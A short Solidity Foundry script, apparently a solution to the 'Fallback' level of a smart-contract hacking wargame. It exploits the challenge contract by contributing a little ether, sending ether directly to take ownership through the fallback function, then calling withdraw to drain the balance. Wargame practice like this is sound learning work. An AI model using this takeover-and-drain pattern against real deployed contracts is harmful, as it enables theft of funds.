// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level1.sol";
import "forge-std/Script.sol";

contract ExploitLevel1 is Script {
    address instance = 0x890CD86886Ff5eDB815aF03cb040D86A36fB5A75;
    Fallback fbInstance = Fallback(payable(instance));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fbInstance.contribute{value: 0.0001 ether}();
        (bool success,) = payable(instance).call{value: 0.00001 ether}("");
        require(success, "failed transfer");
        fbInstance.withdraw();

        vm.stopBroadcast();

        console.log("Instance balance:", instance.balance);
        console.log("Instance owner:", fbInstance.owner());
    }
}
